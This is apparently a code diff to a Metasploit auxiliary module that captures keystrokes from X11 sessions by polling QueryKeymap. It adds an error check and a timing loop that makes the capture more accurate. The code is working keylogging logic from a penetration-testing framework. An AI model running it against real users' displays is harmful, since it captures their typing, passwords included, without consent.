@@ -19,13 +19,11 @@ class MetasploitModule < Msf::Auxiliary
           The module works by connecting to the X11 session, creating a background
           window, binding a keyboard to it and creating a notification alert when a key
           is pressed.
-
           One of the major limitations of xspy, and thus this module, is that it polls
           at a very fast rate, faster than a key being pressed is released (especiall before
           the repeat delay is hit). To combat printing multiple characters for a single key
           press, repeat characters arent printed. If a repeat character is pressed on the
           keyboard, it will unfortunately be ignored.
-
           socat -d -d TCP-LISTEN:6000,fork,bind=127.0.0.1 UNIX-CONNECT:/tmp/.X11-unix/X1
         },
         'License' => MSF_LICENSE,
@@ -158,7 +156,9 @@ class MetasploitModule < Msf::Auxiliary
     connect # tcp connection establish
     vprint_status('(1/9) Establishing X11 connection')
     sock.put(X11CONNECTIONREQUEST.new.to_binary_s) # x11 session establish
-    connection = process_initial_connection_response(sock.get_once(-1, 1))
+    data = sock.get_once(-1, 1)
+    fail_with(Msf::Module::Failure::UnexpectedReply, 'Port connected, but no response to X11 connection attempt') if data.nil?
+    connection = process_initial_connection_response(data)
     if connection.success == 1
       print_good('Successly established X11 connection')
     else
@@ -227,11 +227,25 @@ class MetasploitModule < Msf::Auxiliary
       loop do
         break if timeout > 0 && (stime + timeout < Time.now.to_f)
 
-        Rex.sleep(0.00001) # https://gitlab.com/kalilinux/packages/xspy/-/blob/kali/master/Xspy.c?ref_type=heads#L79
         sock.put(QUERYKEYMAPREQUEST.new.to_binary_s)
         bit_array_of_keystrokes = QUERYKEYMAPREPLY.read(sock.get_once(-1, 1)).data
 
         print_keystroke(bit_array_of_keystrokes, key_map)
+
+        # So we have a timing problem here. The c code does a 10 usec sleep via select
+        # https://gitlab.com/kalilinux/packages/xspy/-/blob/kali/master/Xspy.c?ref_type=heads#L79
+        # when we try to replicate with either ruby sleep(0.00001), orRex.sleep(0.00001), we see
+        # both give a .2 second sleep which is FAR too slow for typing, we miss about 50%
+        # of typed characters at the author's typing speed.
+        #
+        # However, no sleep gives us repeated alternating characters for whatever reason
+        # so 'the' would give ththththththe. Still working on how to get around this
+        stall_start = Time.now
+        while (Time.now - stall_start < 0.001)
+          sock.put(QUERYKEYMAPREQUEST.new.to_binary_s)
+          sock.get_once(-1, 1)
+          # don't print, we're using this to slow things down
+        end
       end
     ensure
       vprint_status('Closing X11 connection')
